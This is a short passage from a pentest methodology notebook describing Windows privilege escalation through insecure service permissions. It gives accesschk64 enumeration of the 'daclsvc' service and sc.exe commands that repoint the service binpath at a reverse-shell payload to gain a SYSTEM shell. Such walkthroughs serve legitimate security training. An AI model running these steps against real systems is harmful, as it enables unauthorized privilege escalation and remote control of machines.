From powerup Invoke-AllChecks:

accesschk64.exe /accepteula -uwqvc daclsvc

As you can see, we practically have full control over this service as just a normal user. 
We will be abusing the “SERVICE_CHANGE_CONFIG” in particular to change the service executable location to our own payload.

Let's modify the path of the executable the service depends on to run.. to our own payload in a different binpath.

sc.exe config daclsvc binpath= "\"C:\Users\user\jaja\reverse.exe\""

sc.exe config daclsvc binpath= "C:\Users\user\jaja\reverse.exe"

And we get a system shell!
![unnamed_82ce491acd0a4a2c94d8db85aaddfc4f](docs/Attachments/Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Windows%20Methodology/Attacks/Service%20Attacks/Insecure%20Service%20Permissions/{{notename}}-202605011506.png)
![unnamed_e826d759382541a89bbe36b045456b60](docs/Attachments/Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Windows%20Methodology/Attacks/Service%20Attacks/Insecure%20Service%20Permissions/{{notename}}-202605011506-1.png)
![unnamed_19e30908fcbf415fb3a07c389a216138](docs/Attachments/Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Windows%20Methodology/Attacks/Service%20Attacks/Insecure%20Service%20Permissions/{{notename}}-202605011506-2.png)
![unnamed_c7e567474a1b4a409c6ada1a0882ae5f](docs/Attachments/Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Windows%20Methodology/Attacks/Service%20Attacks/Insecure%20Service%20Permissions/{{notename}}-202605011507.png)